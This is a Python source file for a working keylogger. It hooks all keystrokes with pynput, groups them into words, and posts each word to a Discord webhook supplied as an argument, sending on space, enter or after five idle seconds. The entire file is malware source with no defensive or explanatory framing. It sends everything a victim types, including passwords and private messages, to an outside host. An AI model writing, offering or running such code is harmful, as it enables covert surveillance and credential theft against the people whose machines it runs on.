from pynput.keyboard import Key, Listener
import time
import threading
from discordwebhook import Discord
import sys

hook = sys.argv[1]
discord = Discord(url=(hook))

word = []
last_pressed = time.time()
idle_message = False

def on_press(key):
    global last_pressed, idle_message
    last_pressed = time.time()
    key_pressed =('{0}'.format(
        key))

    if key == Key.space:
        word_final = ''.join(word)
        word_send = word_final.replace("'", "")
        discord.post(content=word_send)
        word.clear()
        idle_message = False

    elif key == key == Key.enter:
        word_final = ''.join(word)
        word_send = word_final.replace("'", "")
        discord.post(content=word_send)
        discord.post(content="(Enter)")
        word.clear()
        idle_message = False

    elif key == Key.backspace:
        try:
            word.pop()
        except Exception:
            pass

    elif key == Key.shift_l or Key == Key.shift_r:
        pass

    else:
        word.append(key_pressed)
        idle_message = False

def check_last_pressed():
    global last_pressed, idle_message
    while True:
        time.sleep(1)
        current_time = time.time()
        if idle_message == False and current_time - last_pressed >= 5:
            global word
            word_final = ''.join(word)
            word_send = word_final.replace("'", "")
            discord.post(content=word_send)
            word.clear()
            idle_message = True

idle_thread = threading.Thread(target=check_last_pressed)
idle_thread.daemon = True
idle_thread.start()

with Listener(
        on_press=on_press) as listener:
    listener.join()
